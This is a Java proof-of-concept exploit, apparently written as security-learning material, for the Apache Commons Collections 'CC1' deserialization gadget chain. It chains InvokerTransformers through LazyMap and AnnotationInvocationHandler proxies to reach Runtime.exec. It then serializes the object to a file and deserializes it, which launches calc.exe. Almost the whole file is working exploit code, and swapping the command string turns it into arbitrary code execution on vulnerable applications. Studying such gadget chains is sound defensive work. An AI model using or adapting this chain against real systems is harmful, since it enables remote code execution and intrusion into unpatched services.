package Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class POC2 {
    public static void Serialization(Object object) throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("poc2.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("OutPut");
    }

    public static void Unserialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("poc2.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("InPut");
    }

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"C:\\Windows\\System32\\calc.exe" }),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用
        Map innerMap = new HashMap();//创建一个HashMap对象
        innerMap.put("value","xxx");
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, mapProxy);

        Serialization(handler);
        Unserialization();
    }
}
